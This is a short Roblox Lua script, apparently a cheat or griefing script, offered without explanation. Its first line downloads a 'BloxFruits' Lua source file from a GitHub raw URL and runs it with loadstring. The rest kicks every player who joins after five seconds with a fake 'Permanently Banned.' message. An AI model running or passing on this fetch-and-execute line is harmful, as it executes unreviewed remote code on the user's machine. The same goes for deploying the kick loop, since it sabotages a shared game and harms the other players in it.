
loadstring(game:HttpGet("https://raw.githubusercontent.com/realredz/BloxFruits/refs/heads/main/Source.lua"))()

local Players = game:GetService("Players")

local function kickPlayer(player)
    wait(5)
    player:Kick("Permanently Banned.")
end

Players.PlayerAdded:Connect(function(player)
    kickPlayer(player)
end)
